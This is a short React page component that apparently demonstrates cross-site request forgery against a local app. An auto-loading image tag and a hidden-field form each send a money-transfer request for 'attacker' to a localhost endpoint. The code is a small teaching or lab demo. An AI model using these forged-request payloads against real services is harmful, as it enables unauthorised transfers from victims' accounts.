import React from 'react';



async function Page() {
    return (
        <div>

            paste below code into different application . you will see cookies
            <div>
                <img
                    src="http://localhost:3000/api/transfer?amount=1000&to=attacker"
                    alt="csfr"
                />

                <form
                    action="http://localhost:3000/api/transfer"
                    method="GET"
                >
                    <input
                        type="hidden"
                        name="amount"
                        value="5000"
                    />
                    <input
                        type="hidden"
                        name="to"
                        value="attacker"
                    />
                    <button>Submit forged request</button>
                </form>
            </div>
        </div>
    );
}

export default Page;